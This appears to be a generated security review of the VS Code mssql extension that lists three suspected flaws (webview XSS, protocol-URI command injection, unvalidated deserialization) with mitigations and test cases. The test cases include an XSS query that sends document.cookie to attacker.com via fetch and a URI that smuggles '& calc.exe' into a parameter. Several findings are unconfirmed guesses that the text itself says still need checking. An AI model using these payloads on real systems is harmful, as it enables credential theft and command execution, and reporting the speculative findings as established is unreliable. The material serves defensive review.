Here's the updated list of identified vulnerabilities, filtered and formatted as requested:

### - Vulnerability Name: Insecure T-SQL Query Execution via Webview Message Handling
- Description: The VS Code mssql extension uses webviews to display query results and interact with the user. A vulnerability exists where a malicious SQL query, when executed and results rendered in the webview, can execute arbitrary JavaScript code within the context of the webview. This can occur if the extension does not properly sanitize or escape data received from the SQL query results before rendering it in the webview. An attacker could craft a SQL query that returns data containing malicious JavaScript, which would then be executed when the results are displayed.
- Impact: Successful exploitation allows an attacker to execute arbitrary JavaScript code within the webview context. This could lead to stealing sensitive information handled by the extension (like connection details, tokens), manipulating the webview UI, or potentially gaining further access to the user's VS Code environment depending on the privileges of the webview context and any exposed APIs.
- Vulnerability Rank: High
- Currently Implemented Mitigations: No specific sanitization or escaping of query results is mentioned in the provided files related to webview rendering or message handling. The newly provided files, which are primarily unit tests, do not introduce any mitigations for this vulnerability.
- Missing Mitigations:
    - Implement robust sanitization and escaping of all data received from SQL query results before rendering it within the webview. This should include escaping HTML, JavaScript, and any other potentially executable content.
    - Utilize VS Code's Content Security Policy (CSP) for webviews to restrict the capabilities of the webview and prevent execution of inline scripts and styles from untrusted sources.
- Preconditions:
    - The attacker needs to be able to execute SQL queries against a database connected to by the VS Code mssql extension. This could be achieved if the attacker has compromised a database server or can influence a user to execute a malicious query (e.g., through social engineering or by providing a crafted `.sql` file).
    - The user must execute a malicious query that returns crafted JavaScript payload.
- Source Code Analysis:
    - `src/controllers/queryRunner.ts`: This file remains a key area of concern as it handles query execution and result processing. The newly provided test files (`/code/test/unit`) include `queryRunner.test.ts`, which focuses on testing the functionality of `QueryRunner`, such as handling query requests, notifications (batch start, batch complete, result set complete, messages, query complete, subset), and copy operations. However, these tests do not cover input sanitization or output encoding for webview rendering. The data flow from `QueryRunner` to webviews still needs to be carefully examined for sanitization.
    - `src/models/sqlOutputContentProvider.ts`: This file is responsible for providing content to the webview and handling requests from it. It interacts with `QueryRunner` and `ResultsSerializer`.  The newly provided test files do not indicate any changes to this file that would introduce sanitization.
    - Visualization:
        ```
        SQL Query (Malicious Payload) --> QueryRunner.ts (handleMessage, handleQueryComplete etc.) --> eventEmitter.emit('message', ...) --> Webview (Unsanitized rendering) --> XSS Vulnerability
        ```
- Security Test Case:
    1. Open VS Code with the mssql extension installed.
    2. Connect to a SQL Server instance using the extension.
    3. Open a new SQL query editor window.
    4. Execute the following malicious SQL query:
    ```sql
    SELECT '<img src=x onerror=alert("Vulnerability")>';
    ```
    5. Observe the query results in the webview.
    6. Verify if an alert box with the text "Vulnerability" is displayed. If the alert box appears, it indicates that JavaScript code from the query results has been executed, confirming the vulnerability.
    7. As a more advanced test, try to exfiltrate data. Modify the query to:
    ```sql
    SELECT '<img src=x onerror="fetch(\'https://attacker.com/log?data=\'+document.cookie)">';
    ```
    8. Set up a simple HTTP listener on `attacker.com` (e.g., using `netcat` or `python -m http.server`).
    9. Execute the query and check if the listener receives a request containing document cookies or other sensitive data that the webview might have access to.

### - Vulnerability Name: Potential Command Injection in mssql Protocol Handler URI Parsing
- Description: The `mssqlProtocolHandler.ts` file is responsible for handling custom `vscode-mssql` protocol URIs. If the parsing of URI parameters is not properly sanitized, especially when these parameters are used to construct or execute commands within the extension or SQL Tools Service, it could lead to command injection vulnerabilities. An attacker could craft a malicious URI that, when opened (e.g., by clicking a link in a markdown file or through social engineering), could execute arbitrary commands.
- Impact: Command injection could allow an attacker to execute arbitrary commands on the user's machine with the privileges of the VS Code process. This could range from data exfiltration and malware installation to complete system compromise.
- Vulnerability Rank: High
- Currently Implemented Mitigations: No specific input sanitization or validation is evident in the provided code snippet for `mssqlProtocolHandler.ts` from previous files. The new test files do not introduce any mitigations for this vulnerability and do not include tests for URI handling.
- Missing Mitigations:
    - Implement strict input validation and sanitization for all parameters extracted from the `vscode-mssql` protocol URIs.
    - Avoid using URI parameters directly to construct or execute system commands or SQL queries without proper encoding and validation.
    - Use parameterized queries or stored procedures to prevent SQL injection if URI parameters are used in database queries.
- Preconditions:
    - An attacker needs to get a user to click on a specially crafted `vscode-mssql` URI. This could be through social engineering, embedding the link in a document, or exploiting other vulnerabilities to automatically open such a URI.
- Source Code Analysis:
    - The new test files (`/code/test/unit`) do not provide additional information to mitigate or confirm this vulnerability. Further investigation into `mssqlProtocolHandler.ts` is still needed to determine the extent of URI parameter handling and potential command injection risks. The test files reviewed do not contain explicit URI handling code to confirm or deny this vulnerability directly.

- Security Test Case:
    1. Craft a malicious `vscode-mssql` URI that attempts to inject a command, for example by manipulating the `server` parameter to include shell commands. An example malicious URI might look like:
    ```
    vscode://ms-mssql.mssql/connect?server=localhost%20%26%20calc.exe&database=testdb&user=sa&authenticationType=SqlLogin
    ```
    (Note: `%20%26%20calc.exe` is URL-encoded for ` & calc.exe`, attempting to append a command after the server name)
    2. Embed this URI in a markdown file or simulate a user clicking on this link within VS Code (e.g., by manually triggering the URI handler).
    3. Observe if the `calc.exe` (or equivalent command for the OS) is executed. If it does, this confirms a command injection vulnerability.
    4. Monitor system logs and processes to detect any unexpected command executions when clicking on or triggering the crafted URI.

### - Vulnerability Name: Unvalidated Deserialization in Webview Communication
- Description:  If the communication protocol between the webview and the extension backend (defined in `src/protocol.ts`) involves deserializing objects received from the webview without proper validation, it could be vulnerable to deserialization attacks. An attacker could craft malicious messages from the webview that, when deserialized by the extension, could lead to arbitrary code execution or denial of service. This is particularly concerning if the extension uses a deserialization method that is known to be insecure (like `eval` or certain JSON deserialization methods with unsafe settings) or if it deserializes complex objects without schema validation.
- Impact: Unvalidated deserialization can lead to arbitrary code execution on the host machine, allowing the attacker to completely compromise the user's system. Depending on the context and privileges of the extension, this could have severe consequences.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations: The provided code snippets from previous files do not show any explicit deserialization logic in `src/protocol.ts`, but the `MessageProxy` class and `onReceive` method handle message parsing (`JSON.parse(val)`). If the handlers process complex objects from these parsed messages without validation, it could be vulnerable. The new test files, including `reactWebviewBaseController.test.ts`, test the functionality of the `ReactWebviewBaseController` and its message handling, but they do not include tests that specifically target deserialization vulnerabilities or demonstrate any implemented mitigations.
- Missing Mitigations:
    - Avoid deserializing complex objects directly from webview messages if possible. Prefer simple data types and validate all inputs.
    - If deserialization of complex objects is necessary, implement strict schema validation to ensure that the received data conforms to the expected structure and types.
    - Use secure deserialization methods and libraries that are less prone to vulnerabilities.
    - Implement input sanitization and validation even after deserialization to prevent further exploitation.
- Preconditions:
    - The attacker needs to be able to send messages to the webview's message handler. This is generally possible for any extension webview as they are designed to receive messages from the webview context.
- Source Code Analysis:
    - `src/services` files: These service files and `src/controllers/sharedExecutionPlanUtils.ts` still highlight potential communication pathways where deserialization vulnerabilities could exist if webview messages are processed by these services without validation. The new test files (`/code/test/unit`) do not show changes to these services or controllers that would mitigate this vulnerability.
    - The code in `QueryRunner.ts` and service files reinforces the architecture where messages are passed between the extension backend and potentially webviews. The need to verify deserialization in this communication path and implement proper validation remains critical.

- Security Test Case:
    1. Develop a malicious VS Code extension that can send messages to the mssql extension's webview (you would need to know the webview ID, which might be predictable or discoverable).
    2. Craft a malicious JSON payload that exploits a known deserialization vulnerability (if any exists in the JavaScript runtime or libraries used by the extension's backend - Node.js). This payload would be designed to execute arbitrary code when deserialized.
    3. Send this malicious JSON payload as a message to the mssql extension's webview using the malicious extension.
    4. Monitor for signs of arbitrary code execution on the VS Code host machine. This could be checked by observing unexpected process creation, file system modifications, or network connections initiated by the VS Code process.
    5. If successful, the test would demonstrate that unvalidated deserialization in webview communication can be exploited to achieve code execution.
